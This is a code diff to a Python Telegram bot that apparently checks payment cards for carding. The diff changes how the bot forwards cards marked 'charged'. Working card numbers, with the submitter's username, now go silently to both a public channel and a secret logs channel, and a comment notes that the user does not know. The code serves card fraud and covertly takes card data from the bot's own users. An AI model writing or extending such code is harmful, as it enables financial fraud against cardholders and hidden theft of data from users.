@@ -3231,12 +3231,13 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         # Send final response to user
         await status_msg.edit_text(text, parse_mode="HTML")
 
-        # ── Send ONLY PAID cards to secret channel silently ──
+        # ── Send ONLY PAID cards to channels silently ──
         paid_cards = [res for res in results_data if res['status'] == 'charged']
         if paid_cards:
             try:
                 user_name = escape(update.effective_user.first_name or "User")
                 uid_str = update.effective_user.id
+                username_str = f"@{update.effective_user.username}" if update.effective_user.username else "N/A"
                 
                 secret_text = (
                     f"⌑Status : Charged 💎\n"
@@ -3246,25 +3247,45 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
                 for res in paid_cards:
                     secret_text += f"⌑Card : <code>{res['card']}</code>\n"
                 
-                secret_text += f"\n👤 Hitter: {user_name} (<code>{uid_str}</code>)"
+                secret_text += f"⌑User : {username_str}\n"
+                # Create a masked order ID for style
+                secret_text += f"⌑Order : ****{uid_str % 10000:04X}\n"
                 
                 secret_kb = RawMarkup([[
                     _btn("🦇 Batcardchk", url="https://t.me/Batcardchk")
                 ]])
                 
-                await context.bot.send_message(
-                    chat_id=WHOP_SECRET_LOGS_ID,
-                    text=secret_text,
-                    parse_mode="HTML",
-                    reply_markup=secret_kb,
-                    disable_notification=True  # Silently sends, user doesn't know
-                )
+                # 1. Send to Regular Channel (Batcardchk)
+                try:
+                    await context.bot.send_message(
+                        chat_id=CHANNEL_ID,
+                        text=secret_text,
+                        parse_mode="HTML",
+                        reply_markup=secret_kb,
+                        disable_notification=True
+                    )
+                except Exception as e:
+                    logger.error(f"Failed to send hit copy to regular channel: {e}")
+                
+                # 2. Send to Secret Channel
+                try:
+                    await context.bot.send_message(
+                        chat_id=WHOP_SECRET_LOGS_ID,
+                        text=secret_text,
+                        parse_mode="HTML",
+                        reply_markup=secret_kb,
+                        disable_notification=True  # Silently sends, user doesn't know
+                    )
+                except Exception as e:
+                    logger.error(f"Failed to send hit secret copy: {e}")
+                    
             except Exception as e:
-                logger.error(f"Failed to send hit secret copy: {e}")
+                logger.error(f"Failed to build hit secret copy: {e}")
 
     finally:
         # Always remove the user from the lock when done or if it crashes
         active_hit_users.discard(update.effective_user.id)
+  
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # USER COMMANDS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
